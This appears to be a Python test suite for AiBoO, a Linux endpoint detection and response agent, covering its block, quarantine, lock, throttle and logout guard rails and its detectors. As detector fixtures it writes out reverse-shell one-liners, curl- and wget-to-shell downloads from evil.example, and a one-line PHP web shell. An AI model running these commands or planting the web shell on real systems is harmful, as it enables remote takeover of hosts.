"""
Tests for the AiBoO Linux response engine + the EDR-ish collectors.

    python3 tests/test_response.py
"""

import importlib.util
import json
import os
import socket
import subprocess
import sys
import tempfile
import time
from pathlib import Path

DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(DIR))


def _load(name: str):
    spec = importlib.util.spec_from_file_location(name, DIR / f"{name}.py")
    mod = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod
    spec.loader.exec_module(mod)
    return mod


agent = _load("aiboo_linux_agent")
resp = _load("aiboo_linux_response")


def settings(**kw):
    st = agent.Settings(dry_run=True, endpoint_name="test-linux",
                        remote_url="http://127.0.0.1:4000")
    for k, v in kw.items():
        setattr(st, k, v)
    return st


def engine(**kw):
    tmp = Path(tempfile.mkdtemp(prefix="aiboo-test-"))
    st = settings(**kw)
    return resp.ResponseEngine(st, lambda m, level="INFO": None, tmp), tmp


# --------------------------------------------------------------------------
# guard rails
# --------------------------------------------------------------------------

def test_read_only_mode_refuses_change_actions():
    eng, _ = engine(allow_response=False, response_dry_run=True)
    out = eng.execute("block_access", "45.95.147.3")
    assert out["status"] == "failed"
    assert "READ-ONLY" in out["message"]


def test_localhost_and_the_aiboo_server_are_never_blocked():
    eng, _ = engine(allow_response=True, response_dry_run=True)
    for ip in ("127.0.0.1", "::1", "localhost", "127.0.0.5"):
        assert eng.block_ip(ip)["status"] == "failed", ip
    # the AiBoO server itself (127.0.0.1 in this test) is refused too
    assert eng.block_ip("127.0.0.1")["status"] == "failed"


def test_pseudo_lock_works_even_in_read_only_mode():
    """The decoy changes nothing on the server, so it is always allowed."""
    eng, _ = engine(allow_response=False)
    out = eng.pseudo_lock("test")
    assert out["status"] == "executed"
    port = out["metadata"]["decoy_port"]
    assert 32768 <= port <= 60999
    # connect to the decoy like an intruder would
    s = socket.create_connection(("127.0.0.1", port), timeout=5)
    banner = s.recv(64)
    s.sendall(b"admin:admin123\n")
    s.close()
    time.sleep(0.5)
    assert banner.startswith((b"SSH-", b"220", b"HTTP/1.1"))
    hits = [e for e in eng.drain_events() if e["kind"] == "decoy_hit"]
    assert hits, "the decoy must record the connection"
    assert hits[0]["port"] == port
    restore = eng.execute("restore_pseudo_lock", out["metadata"]["lock_id"])
    assert restore["status"] == "executed"
    assert not eng.active_decoys()


def test_protected_processes_are_refused():
    eng, _ = engine(allow_response=True, response_dry_run=True)
    assert eng.terminate_process("1")["status"] == "failed"          # PID 1
    assert eng.terminate_process("systemd")["status"] == "failed"
    assert eng.terminate_process("not-a-real-process-xyz")["status"] == "failed"


def test_system_accounts_and_root_are_never_locked():
    eng, _ = engine(allow_response=True, response_dry_run=True)
    for user in ("root", "daemon", "no-such-user-abc"):
        out = eng.lock_user(user, 30)
        assert out["status"] == "failed", user
    # the account the agent runs as is refused as well
    me = os.environ.get("USER") or ""
    if me:
        assert eng.lock_user(me, 30)["status"] == "failed"


def test_unknown_action_is_reported_clearly():
    eng, _ = engine(allow_response=True)
    out = eng.execute("quarantine_device_xyz", "1.2.3.4")
    assert out["status"] == "failed"
    assert "not supported by the Linux agent" in out["message"]


# --------------------------------------------------------------------------
# dry-run behaviour + the audit log
# --------------------------------------------------------------------------

def test_dry_run_blocks_nothing_but_is_recorded():
    eng, tmp = engine(allow_response=True, response_dry_run=True)
    out = eng.execute("block_access", "45.95.147.3", {"reason": "test"})
    assert out["status"] == "executed"
    assert "dry-run" in out["message"].lower() or out["metadata"]["dry_run"] is True
    log = (Path(tmp) / "actions.jsonl").read_text().strip().splitlines()
    assert log and json.loads(log[-1])["action"] == "block_access"
    assert json.loads(log[-1])["target"] == "45.95.147.3"


def test_capabilities_are_reported():
    eng, _ = engine()
    caps = eng.capabilities()
    for key in ("allow_response", "root", "sudo_nopasswd", "can_change", "tools"):
        assert key in caps
    assert isinstance(caps["tools"], dict)


# --------------------------------------------------------------------------
# quarantine / restore (real file moves inside a temp folder)
# --------------------------------------------------------------------------

def test_quarantine_refuses_paths_outside_the_allowed_folders():
    eng, _ = engine(allow_response=True, response_dry_run=True, watch_dirs="")
    out = eng.execute("quarantine_file", "/etc/shadow")
    assert out["status"] == "failed"
    assert "outside the allowed folders" in out["message"]


def test_quarantine_and_restore_a_real_file():
    tmp = Path(tempfile.mkdtemp(prefix="aiboo-quar-"))
    watch = tmp / "webroot"
    watch.mkdir()
    shell = watch / "upload.php"
    shell.write_text("<?php system($_GET['c']); ?>")
    eng, _ = engine(allow_response=True, response_dry_run=False,
                    watch_dirs=str(watch), quarantine_dir=str(tmp / "q"))
    out = eng.execute("quarantine_file", str(shell), {"reason": "web shell"})
    assert out["status"] == "executed", out
    assert not shell.exists(), "the file must be moved away"
    assert out["metadata"]["sha256"]
    # restore by original path
    back = eng.execute("restore_file", str(shell))
    assert back["status"] == "executed", back
    assert shell.exists()


def test_quarantine_refuses_symlinks():
    tmp = Path(tempfile.mkdtemp(prefix="aiboo-quar-"))
    watch = tmp / "webroot"
    watch.mkdir()
    real = watch / "real.txt"
    real.write_text("x")
    link = watch / "link.txt"
    link.symlink_to(real)
    eng, _ = engine(allow_response=True, response_dry_run=False,
                    watch_dirs=str(watch), quarantine_dir=str(tmp / "q"))
    out = eng.execute("quarantine_file", str(link))
    assert out["status"] == "failed" and "symlink" in out["message"]


def test_restore_reports_when_nothing_matches():
    eng, _ = engine(allow_response=True, response_dry_run=False)
    out = eng.execute("restore_file", "deadbeef")
    assert out["status"] == "failed" and "nothing in quarantine" in out["message"]


# --------------------------------------------------------------------------
# users: restriction timer
# --------------------------------------------------------------------------

def test_restriction_timer_is_written_and_reported_due():
    eng, _ = engine(allow_response=True, response_dry_run=True)
    eng._schedule_unlock("someuser", 0.001)          # 0.001 min = 60 ms
    time.sleep(0.2)
    assert "someuser" in eng.restrictions_due()


# --------------------------------------------------------------------------
# EDR collectors
# --------------------------------------------------------------------------

def test_reverse_shell_patterns():
    bad = [
        "bash -i >& /dev/tcp/10.0.0.9/4444 0>&1",
        "nc -e /bin/sh 10.0.0.9 4444",
        "curl http://evil.example/x.sh | bash",
        "wget -qO- http://evil.example/y.sh | sh",
        "python3 -c import socket,subprocess",
        "socat TCP:1.2.3.4:9001 EXEC:/bin/bash",
        "mkfifo /tmp/f; cat /tmp/f | sh -i",
        "mkfifo /tmp/f; nc 1.2.3.4 4444 < /tmp/f | sh > /tmp/f",
    ]
    for cmd in bad:
        assert agent.REVERSE_SHELL_RE.search(cmd), cmd
    for cmd in ("/usr/sbin/nginx: worker process", "python3 aiboo_linux_agent.py",
                "systemd-journald", "postgres: writer process"):
        assert not agent.REVERSE_SHELL_RE.search(cmd), cmd


def test_a_reverse_shell_needs_a_network_step():
    """A bare tool name is not a C2: these are normal Linux commands."""
    for cmd in ("chmod +x /tmp/linux-exploit", "mkfifo /tmp/f",
                "strip -g -p /usr/lib/libfoo.so", "cp --reflink=auto -fLp /usr/bin/x /usr/bin/y"):
        assert not agent.REVERSE_SHELL_RE.search(cmd), cmd


def test_ubuntu_kernel_update_is_not_an_attack():
    """Real lines from the EC2 that were wrongly reported as reverse shells."""
    for cmd in (
        "strip -g -p /var/tmp/dracut.dxy0bhv/initramfs/usr/libexec/plymouth/plymouthd.default",
        "cp --reflink=auto -fLp /usr/bin/../lib/cargo/bin/coreutils/coreutils /var/tmp/dracut.dxy0bhv/initramfs/usr/lib/cargo/bin/coreutils/coreutils",
        "/usr/lib/dracut/dracut-install -D /var/tmp/dracut.dxy0bhv/initramfs -a -m -o -m 1 plymouth",
        "cp --reflink=auto -dfrp -L -t /var/tmp/dracut.dxy0bhv/initramfs/usr/lib/firmware",
        "chmod +x /var/tmp/dracut.dxy0bhv/initramfs/usr/lib/dracut/modules.d/90kernel-modules/module-setup.sh",
        "/bin/sh -c mkfifo /var/tmp/dracut.dxy0bhv/initqueue-finished",
        "dpkg -i /var/cache/apt/archives/linux-image-6.8.0-45-generic_6.8.0-45.46_amd64.deb",
    ):
        assert agent.is_maintenance_command(cmd), cmd
        assert not agent.REVERSE_SHELL_RE.search(cmd), cmd
        assert agent.find_tool_marker(cmd) == "", f"{cmd} matched tool {agent.find_tool_marker(cmd)}"


def test_attack_tools_are_matched_as_whole_tokens_only():
    assert agent.find_tool_marker("cp --reflink=auto -dfrp -L -t /var/tmp/x") == ""
    assert agent.find_tool_marker("/tmp/.hidden/pspy64 -pf") == "pspy"
    assert agent.find_tool_marker("xmrig -o pool.evil.tld:3333") == "xmrig"
    assert agent.find_tool_marker("nmap -sS 10.0.0.0/24") == "nmap"
    assert agent.find_tool_marker("/usr/bin/python3 /opt/app/main.py") == ""


def test_sudo_matching_uses_whole_words():
    # substring bugs that fired on a real server: "mount " inside "umount", and
    # every package install because of the word "curl"/"python" inside the list
    assert agent.find_suspicious_sudo("/usr/bin/umount /mnt/data") == ""
    assert agent.find_suspicious_sudo("/usr/bin/fusermount3 -u /run/user/1000") == ""
    assert agent.find_suspicious_sudo("/usr/bin/apt-get install -y curl") == ""
    assert agent.find_suspicious_sudo("/usr/bin/dpkg -i /tmp/pkg.deb") == ""
    assert agent.find_suspicious_sudo("/usr/bin/unattended-upgrade") == ""
    # still caught: privilege / identity / firewall / log tampering
    assert agent.find_suspicious_sudo("usr/bin/usermod -L bob") == "usermod"
    assert agent.find_suspicious_sudo("/bin/bash -c whoami") == "bash"
    assert agent.find_suspicious_sudo("iptables -F") == "iptables"
    assert agent.find_suspicious_sudo("rm -rf /var/log/*") == "rm -rf /var/log"
    assert agent.find_suspicious_sudo("/usr/sbin/chpasswd") == "chpasswd"   # password changes matter


def test_the_agent_does_not_alert_on_its_own_response_actions():
    """AiBoO reads the same logs it writes to - its own block/kill/lock must be ignored."""
    eng, _ = engine(allow_response=True, response_dry_run=False)

    class FakeState:
        pass

    state = FakeState()
    state.engine = eng
    # pretend a real action ran (dry-run must NOT count as "we did this")
    eng.is_root = True
    eng.dry = False
    real_run = eng._run
    import subprocess as _sp
    class R:
        returncode, stdout, stderr = 0, "", ""
    _sp.run = lambda *a, **k: R()

    eng._remember_ran(["iptables", "-I", "INPUT", "-s", "45.95.147.3", "-j", "DROP"])
    assert agent.state_ran_recently(state, "/usr/sbin/iptables -I INPUT -s 45.95.147.3 -j DROP")
    assert not agent.state_ran_recently(state, "/usr/sbin/iptables -F")

    # and a dry-run engine is not remembered at all
    eng2, _ = engine(allow_response=True, response_dry_run=True)
    eng2._run(["usermod", "-L", "bob"])
    assert getattr(eng2, "ran", []) == [], "dry-run commands must not be remembered"


def test_running_reverse_shell_process_is_detected():
    """Spawn a real process with a C2-looking command line and find it."""
    proc = subprocess.Popen([sys.executable, "-c", "import socket,subprocess,time; time.sleep(30)"])
    try:
        time.sleep(0.4)
        st = settings()
        state = agent.AgentState(Path(tempfile.mkdtemp()) / "state.json")
        state.counters.now = time.time()
        found = agent.detect_suspicious_processes(st, state)
        assert any(f.pattern == "reverse_shell" and str(proc.pid) in f.summary for f in found), \
            f"pid {proc.pid} should be reported"
    finally:
        proc.kill()


def test_miner_and_tool_markers():
    st = settings()
    state = agent.AgentState(Path(tempfile.mkdtemp()) / "state.json")
    assert "xmrig" in agent.TOOL_MARKERS
    assert "sqlmap" in agent.TOOL_MARKERS
    assert state.already_sent("nothing") is False


def test_auditd_execve_record_is_parsed():
    # a real auditd line shape: proctitle is hex, argv is a1=../a2=..
    title = b"bash -i >& /dev/tcp/10.0.0.9/4444".hex()
    line = ('type=EXECVE msg=audit(1700000000.123:456): argc=3 a0="bash" a1="-i" '
            f'a2=">&" proctitle={title}')
    st = settings()
    state = agent.AgentState(Path(tempfile.mkdtemp()) / "state.json")
    state.counters.now = time.time()
    out = agent.detect_audit_line(line, st, state, "/var/log/audit/audit.log")
    assert out and out[0].pattern == "reverse_shell"
    assert "10.0.0.9" in out[0].summary or "/dev/tcp" in out[0].summary


def test_auditd_ptrace_is_process_injection():
    line = ('type=SYSCALL msg=audit(1700000001.1:457): arch=c000003e syscall=101 '
            'success=yes exit=0 pid=4242 comm="gdb" exe="/usr/bin/gdb" key="ptrace"')
    st = settings()
    state = agent.AgentState(Path(tempfile.mkdtemp()) / "state.json")
    state.counters.now = time.time()
    out = agent.detect_audit_line(line, st, state, "audit.log")
    assert any(f.pattern == "process_injection" for f in out)


def test_auditd_root_execution_from_tmp_is_flagged():
    line = ('type=SYSCALL msg=audit(1700000002.1:458): syscall=execve success=yes exit=0 '
            'uid=0 pid=5000 comm="kworker" exe="/tmp/.hidden/x" key="exec"')
    st = settings()
    state = agent.AgentState(Path(tempfile.mkdtemp()) / "state.json")
    state.counters.now = time.time()
    out = agent.detect_audit_line(line, st, state, "audit.log")
    assert any(f.pattern == "dropped_file" for f in out)


def test_integrity_finds_a_new_web_shell():
    tmp = Path(tempfile.mkdtemp(prefix="aiboo-watch-"))
    (tmp / "index.html").write_text("ok")
    st = settings(watch_dirs=str(tmp))
    state = agent.AgentState(tmp / "state.json")
    state.counters.now = time.time()
    first = agent.detect_integrity(st, state)
    assert first == []                      # nothing dangerous yet
    (tmp / "shell.php").write_text("<?php system($_GET['c']); ?>")
    found = agent.detect_integrity(st, state)
    assert any(f.pattern == "dropped_file" and "shell.php" in f.summary for f in found)
    assert found[0].extra["sha256"]


def test_integrity_reports_until_the_finding_is_sent():
    """The collector must NOT mark its own finding as sent (that hid web shells).

    Sender.send_finding() remembers the key once the server accepts it, so the
    scan keeps offering the finding until then and goes quiet afterwards.
    """
    tmp = Path(tempfile.mkdtemp(prefix="aiboo-watch-"))
    (tmp / "x.sh").write_text("echo hi")
    st = settings(watch_dirs=str(tmp))
    state = agent.AgentState(tmp / "state.json")
    state.counters.now = time.time()

    first = agent.detect_integrity(st, state)
    assert [f.pattern for f in first] == ["dropped_file"], first
    assert agent.detect_integrity(st, state), "still not sent - it must be offered again"

    state.remember(first[0].dedup_key)          # what Sender.send_finding() does
    assert agent.detect_integrity(st, state) == [], "already sent - must stay quiet"
    (tmp / "x.sh").unlink(missing_ok=True)
    tmp.rmdir()


# --------------------------------------------------------------------------
# firewall tool selection - a rule in a switched-off ufw drops NOTHING
# --------------------------------------------------------------------------

def _with_fake_system(tools, ufw_active, fn):
    real_which, real_active = resp.shutil.which, resp.ResponseEngine._ufw_active
    resp.shutil.which = lambda name: f"/usr/sbin/{name}" if name in tools else None
    resp.ResponseEngine._ufw_active = lambda self: ufw_active
    try:
        return fn()
    finally:
        resp.shutil.which, resp.ResponseEngine._ufw_active = real_which, real_active


def test_ufw_active_is_used_when_it_really_filters():
    eng, _ = engine(allow_response=True, response_dry_run=False)
    ran = []
    real_run = eng._run
    eng._run = lambda cmd: (ran.append(cmd), (0, "Rule added"))[1]
    try:
        tool = _with_fake_system({"ufw"}, True, eng._firewall_tool_preferred)
    finally:
        eng._run = real_run
    assert tool == "ufw", tool


def test_switched_off_ufw_falls_back_to_iptables():
    """The EC2 case: ufw installed but inactive -> AiBoO must not silently 'block'."""
    eng, _ = engine(allow_response=True, response_dry_run=False)
    tool = _with_fake_system({"ufw", "iptables"}, False, eng._firewall_tool_preferred)
    assert tool == "iptables", tool

    ran = []
    eng._run = lambda cmd: (ran.append(cmd), (0, ""))[1]
    out = _with_fake_system({"ufw", "iptables"}, False,
                            lambda: eng.block_ip("45.95.147.3", "test"))
    assert out["status"] == "executed", out
    assert out["metadata"]["tool"] == "iptables", out["metadata"]
    assert any(c[:1] == ["iptables"] and "INPUT" in c for c in ran), ran
    assert any(c[:1] == ["iptables"] and "OUTPUT" in c for c in ran), ran


def test_ufw_only_and_inactive_blocks_but_warns_loudly():
    eng, _ = engine(allow_response=True, response_dry_run=False)
    ran = []
    eng._run = lambda cmd: (ran.append(cmd), (0, "Rule added"))[1]
    out = _with_fake_system({"ufw"}, False, lambda: eng.block_ip("45.95.147.3", "test"))
    assert out["status"] == "executed", out
    assert "NOT enabled" in out["message"], out["message"]
    assert out["metadata"]["enforced"] is False, out["metadata"]


def test_block_then_unblock_use_the_same_tool():
    eng, _ = engine(allow_response=True, response_dry_run=False)
    ran = []
    eng._run = lambda cmd: (ran.append(cmd), (0, ""))[1]
    _with_fake_system({"ufw", "iptables"}, False, lambda: eng.block_ip("45.95.147.3"))
    _with_fake_system({"ufw", "iptables"}, False, lambda: eng.unblock_ip("45.95.147.3"))
    iptables_calls = [c for c in ran if c[0] == "iptables"]
    ufw_calls = [c for c in ran if c[0] == "ufw"]
    assert iptables_calls and not ufw_calls, (iptables_calls, ufw_calls)
    assert any("-D" in c for c in iptables_calls), iptables_calls


# --------------------------------------------------------------------------
# target validation - only real addresses may reach a firewall command
# --------------------------------------------------------------------------

def _with_fake_iptables(fn):
    """Pretend iptables exists (this sandbox has no firewall tools at all)."""
    return _with_fake_system({"iptables"}, False, fn)


def test_junk_and_names_are_never_blocked():
    """Ubuntu showed this: 'iptables -s 1' or '-s localhost' can become a rule."""
    eng, _ = engine(allow_response=True, response_dry_run=False)
    ran = []
    eng._run = lambda cmd: (ran.append(cmd), (0, ""))[1]
    bad_targets = ["1", "localhost", "example.com", "0.0.0.0/0", "", "  ",
                   "::ffff:127.0.0.1", "169.254.169.254", "255.255.255.255", "999.1.1.1",
                   "10.0.0.0/8", "127.0.0.1", "127.1.2.3", "::1"]
    for t in bad_targets:
        out = eng.block_ip(t, "guard test")
        assert out["status"] == "failed", f"{t!r} was not refused: {out}"
    assert ran == [], f"a firewall command was built for a bad target: {ran}"


def test_real_public_address_is_still_allowed():
    def go():
        eng, _ = engine(allow_response=True, response_dry_run=False)
        ran = []
        eng._run = lambda cmd: (ran.append(cmd), (0, ""))[1]
        out = eng.block_ip("45.95.147.3", "real attacker")
        return out, ran
    out, ran = _with_fake_iptables(go)
    assert out["status"] == "executed", out
    assert any("45.95.147.3" in c for c in ran), ran


def test_a_network_that_contains_the_aiboo_server_is_refused():
    # AiBoO server lives at 203.0.113.9 -> a /24 around it must be refused,
    # otherwise the agent would cut off the dashboard it reports to.
    eng, _ = engine(allow_response=True, response_dry_run=False,
                    remote_url="http://203.0.113.9:4000")
    out = eng.block_ip("203.0.113.0/24")
    assert out["status"] == "failed", out
    assert "AiBoO server" in out["message"], out["message"]
    assert eng.block_ip("203.0.113.9")["status"] == "failed"
    assert eng.block_ip("198.51.100.0/24")["status"] in ("executed", "failed")


def test_a_normal_network_can_still_be_blocked():
    def go():
        eng, _ = engine(allow_response=True, response_dry_run=False)
        ran = []
        eng._run = lambda cmd: (ran.append(cmd), (0, ""))[1]
        return eng.block_ip("203.0.113.0/24"), ran
    out, ran = _with_fake_iptables(go)
    assert out["status"] == "executed", out
    assert any("203.0.113.0/24" in c for c in ran), ran


# --------------------------------------------------------------------------
# account lock - never claim an unlock that did not happen
# --------------------------------------------------------------------------

def _with_fake_accounts(state_after, fn):
    """Pretend passwd -S reports `state_after` and usermod prints its warning."""
    real_which, real_run = resp.shutil.which, resp.ResponseEngine._run

    def fake_run(self, cmd, stdin=None):
        if cmd[:1] == ["passwd"]:
            return 0, f"aibootest {state_after} 2026-10-06 0 99999 7 -1"
        if cmd[:1] == ["usermod"]:
            return 0, "unlocking the user's password would result in a passwordless account"
        return 0, ""

    real_uid = resp.ResponseEngine._user_uid
    resp.ResponseEngine._run = fake_run
    resp.ResponseEngine._user_uid = lambda self, user: 1005      # a normal desktop user
    resp.shutil.which = lambda n: f"/usr/sbin/{n}" if n in ("usermod", "passwd", "loginctl") else None
    try:
        eng, _ = engine(allow_response=True, response_dry_run=False)
        return fn(eng)
    finally:
        resp.ResponseEngine._run = real_run
        resp.ResponseEngine._user_uid = real_uid
        resp.shutil.which = real_which


def test_passwordless_account_unlock_is_reported_as_failed():
    out = _with_fake_accounts("L", lambda eng: eng.unlock_user("aibootest"))
    assert out["status"] == "failed", out
    assert "no password set" in out["message"], out["message"]


def test_working_unlock_is_reported_as_executed():
    out = _with_fake_accounts("P", lambda eng: eng.unlock_user("aibootest"))
    assert out["status"] == "executed", out
    assert "unlocked" in out["message"], out["message"]


def test_lock_that_did_not_take_effect_is_reported_as_failed():
    out = _with_fake_accounts("P", lambda eng: eng.lock_user("aibootest"))
    assert out["status"] == "failed", out
    assert "still shows the account as usable" in out["message"], out["message"]


def test_ipv6_target_uses_ip6tables():
    def go():
        eng, _ = engine(allow_response=True, response_dry_run=False)
        ran = []
        eng._run = lambda cmd: (ran.append(cmd), (0, ""))[1]
        return eng.block_ip("2001:db8::1", "ipv6 attacker"), ran
    out, ran = _with_fake_system({"iptables", "ip6tables"}, False, go)
    assert out["status"] == "executed", out
    assert any(c[:1] == ["ip6tables"] for c in ran), ran
    assert not any(c[:1] == ["iptables"] for c in ran), ran


def test_ipv6_without_ip6tables_fails_honestly():
    def go():
        eng, _ = engine(allow_response=True, response_dry_run=False)
        eng._run = lambda cmd: (0, "")
        return eng.block_ip("2001:db8::1", "ipv6 attacker")
    out = _with_fake_system({"iptables"}, False, go)          # ip6tables missing
    assert out["status"] == "failed", out
    assert "ip6tables" in out["message"], out["message"]


def test_unblock_also_refuses_junk_targets():
    eng, _ = engine(allow_response=True, response_dry_run=False)
    for t in ("", "localhost", "1", "0.0.0.0/0"):
        out = eng.unblock_ip(t)
        assert out["status"] == "failed", f"{t!r} was not refused: {out}"


# --------------------------------------------------------------------------
# throttling (throttle_segment / remove_throttle) - really rate-limits on Linux
# --------------------------------------------------------------------------

def test_throttle_installs_a_hashlimit_rule_pair_not_a_full_block():
    """DROP goes in first, then the limited ACCEPT above it: excess packets drop."""
    eng, tmp = engine(allow_response=True, response_dry_run=False)
    ran = []
    eng._run = lambda cmd, timeout=20: (ran.append(list(cmd)), (0, ""))[1]
    real_which = resp.shutil.which
    resp.shutil.which = lambda n: "/usr/sbin/iptables" if n == "iptables" else (
        real_which(n) if n != "pkill" else None)
    try:
        out = eng.throttle_ip("45.95.147.3", kbps=256, minutes=0)
    finally:
        resp.shutil.which = real_which
    assert out["status"] == "executed", out
    assert out["metadata"]["mode"] == "hashlimit", out
    assert out["metadata"]["approx"] is True, out
    joined = [" ".join(c) for c in ran]
    assert any("hashlimit" in j and "--hashlimit-upto" in j and "-j ACCEPT" in j for j in joined), joined
    assert any("comment" in j and "aiboo_throttle_" in j and "-j DROP" in j for j in joined), joined
    # the ACCEPT must be inserted after the DROP, so it ends up above it
    assert "hashlimit" in joined[-1], f"wrong rule order: {joined}"


def test_throttle_converts_kbps_to_packets_and_says_it_is_approximate():
    eng, _ = engine(allow_response=True, response_dry_run=True)
    out = eng.throttle_ip("45.95.147.3", kbps=1200, minutes=5)
    assert out["status"] == "executed", out
    # 1200 kbit/s at 1500-byte packets = 100 packets/s
    assert out["metadata"]["pps"] == 100, out["metadata"]
    assert "would rate-limit" in out["message"] and "dry-run" in out["message"], out


def test_throttle_refuses_localhost_and_the_aiboo_server():
    eng, _ = engine(allow_response=True, response_dry_run=True)
    for ip in ("127.0.0.1", "0.0.0.0/0", "localhost"):
        out = eng.throttle_ip(ip)
        assert out["status"] == "failed", f"{ip} was not refused: {out}"
        assert "refused to throttle" in out["message"], out["message"]


def test_throttle_falls_back_to_a_block_when_hashlimit_is_missing_and_says_so():
    eng, _ = engine(allow_response=True, response_dry_run=False)
    calls = []

    def fake_run(cmd, timeout=20):
        calls.append(list(cmd))
        if "hashlimit" in cmd:
            return 2, "iptables: No chain/target/match by that name."
        return 0, ""

    eng._run = fake_run
    real_which = resp.shutil.which
    resp.shutil.which = lambda n: "/usr/sbin/iptables" if n == "iptables" else None
    try:
        out = eng.throttle_ip("45.95.147.3", kbps=256, minutes=0)
    finally:
        resp.shutil.which = real_which
    assert out["status"] == "executed", out
    assert out["metadata"].get("fell_back_to_block") is True, out
    assert "hashlimit is not available" in out["message"], out["message"]
    joined = [" ".join(c) for c in calls]
    assert any("-j DROP" in j and "hashlimit" not in j for j in joined), joined


def test_remove_throttle_deletes_by_comment_so_a_real_block_survives():
    eng, _ = engine(allow_response=True, response_dry_run=False)
    ran = []
    eng._run = lambda cmd, timeout=20: (ran.append(list(cmd)), (0, ""))[1]
    out = eng.remove_throttle_ip("45.95.147.3")
    assert out["status"] == "executed", out
    joined = [" ".join(c) for c in ran]
    assert all("aiboo_throttle_" in j for j in joined), f"an untagged rule was deleted: {joined}"
    assert not any(j.startswith("iptables -D INPUT -s 45.95.147.3 -j DROP") for j in joined), joined


def test_expired_throttle_is_removed_by_the_agent_timer():
    eng, tmp = engine(allow_response=True, response_dry_run=False)
    ran = []
    eng._run = lambda cmd, timeout=20: (ran.append(list(cmd)), (0, ""))[1]
    eng._schedule_throttle_removal("45.95.147.3", minutes=-1, pps=21)   # already due
    done = eng.expire_throttles()
    assert done and "45.95.147.3" in done[0], done
    assert ran, "no iptables command was run to remove the expired limit"


def test_throttle_is_off_in_read_only_mode():
    eng, _ = engine(allow_response=False, response_dry_run=True)
    out = eng.throttle_ip("45.95.147.3")
    assert out["status"] == "failed", out
    assert "allow_response = no" in out["message"], out["message"]


# --------------------------------------------------------------------------
# force_logout - the Windows "log off user" equivalent
# --------------------------------------------------------------------------

def test_force_logout_closes_the_sessions_of_a_normal_user():
    eng, _ = engine(allow_response=True, response_dry_run=False)
    ran = []
    eng._run = lambda cmd, timeout=20: (ran.append(list(cmd)), (0, ""))[1]
    real_which, real_uid = resp.shutil.which, eng._user_uid
    other_uid = os.geteuid() + 7          # a normal user, never this process
    eng._user_uid = lambda u: other_uid
    resp.shutil.which = lambda n: f"/usr/bin/{n}" if n in ("loginctl", "pkill") else None
    try:
        out = eng.force_logout("deploy")
    finally:
        resp.shutil.which, eng._user_uid = real_which, real_uid
    assert out["status"] == "executed", out
    joined = [" ".join(c) for c in ran]
    assert any(c[0] == "loginctl" and "terminate-user" in c for c in ran), joined
    assert any(c[0] == "pkill" and "-u" in c for c in ran), joined


def test_force_logout_refuses_root_system_accounts_and_the_agent_user():
    eng, _ = engine(allow_response=True, response_dry_run=False)
    real_uid = eng._user_uid
    try:
        eng._user_uid = lambda u: {"root": 0, "sshd": 105}.get(u, 1002)
        for user in ("root", "sshd", ""):
            out = eng.force_logout(user)
            assert out["status"] == "failed", f"{user!r} was not refused: {out}"
        # the account the agent itself runs as
        uid = os.geteuid()
        eng._user_uid = lambda u: uid
        out = eng.force_logout("ubuntu")
        assert out["status"] == "failed", out
        assert "agent itself" in out["message"], out["message"]
    finally:
        eng._user_uid = real_uid


if __name__ == "__main__":
    passed = failed = 0
    for name, fn in sorted(globals().items()):
        if not name.startswith("test_") or not callable(fn):
            continue
        try:
            fn()
            passed += 1
            print(f"PASS  {name}")
        except AssertionError as exc:
            failed += 1
            print(f"FAIL  {name}: {exc}")
        except Exception as exc:                                  # noqa: BLE001
            failed += 1
            print(f"ERROR {name}: {type(exc).__name__}: {exc}")
    print(f"\n{passed} passed, {failed} failed")
    sys.exit(1 if failed else 0)
